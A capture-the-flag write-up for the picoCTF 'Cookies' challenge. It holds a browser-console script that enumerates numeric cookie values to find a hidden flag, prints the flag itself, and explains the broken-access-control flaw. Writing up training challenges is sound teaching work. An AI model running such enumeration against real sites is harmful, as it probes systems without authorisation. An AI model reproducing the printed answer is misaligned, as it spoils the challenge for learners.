# Cookies

**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF — picoGym  

---

## Description

A cookie search page where the server uses a numeric cookie value (`name=0` to `name=28`) to look up cookie types. The flag was hidden behind one of these numeric IDs.

---

## Approach

### Step 1 — Recon
Landed on a cookie search page. After searching, noticed the cookie changed from `name=-1` to `name=0`. Incrementing the value manually showed different cookie names on each number.

### Step 2 — Automation
Instead of manually trying all 28 values, used a browser console script to iterate through all values automatically:

```javascript
async function findFlag() {
  for(let i = 0; i <= 28; i++) {
    document.cookie = "name=" + i + "; path=/";
    let r = await fetch("/", {credentials: "include"});
    let text = await r.text();
    if(text.includes("picoCTF")) {
      console.log("FLAG FOUND at cookie " + i);
      console.log(text.match(/picoCTF{.*?}/)[0]);
      break;
    }
  }
}
findFlag();
```

### Step 3 — Flag Found
Cookie value `18` returned the flag.

---

## Flag

```
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

---

## Root Cause

The server used a sequential numeric cookie to look up content — including a hidden flag — with no authentication or access control. An attacker could enumerate all possible values trivially.

This maps to **OWASP A01 — Broken Access Control**.

---

## Lesson Learned

> Never use predictable sequential IDs to gate access to sensitive content. Always validate server-side that the requesting user is authorized to access the requested resource — not just that they have a valid-looking cookie value.
